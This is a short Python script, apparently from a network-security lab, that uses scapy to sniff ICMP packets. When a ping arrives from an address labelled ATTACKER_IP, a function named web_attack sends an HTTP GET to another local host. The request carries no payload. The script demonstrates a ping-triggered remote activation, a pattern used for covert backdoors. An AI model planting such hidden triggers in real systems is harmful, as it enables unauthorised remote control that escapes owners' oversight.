from scapy.all import *
import requests

ATTACKER_IP = "192.168.64.5"


def web_attack(packet):
    if packet[IP].src == ATTACKER_IP and packet.haslayer(ICMP):
        if packet[ICMP].type == 8:
            print(f"Received ping from {ATTACKER_IP}, now sending HTTP request to '192.168.64.8:5000'")
            response = requests.get("http://192.168.64.8:5000")
            print("Request has been sent. The response status code: ", response.status_code)

# Start sniffing for packets
print("now listening for packets")
sniff(prn=web_attack, filter="icmp", store=0)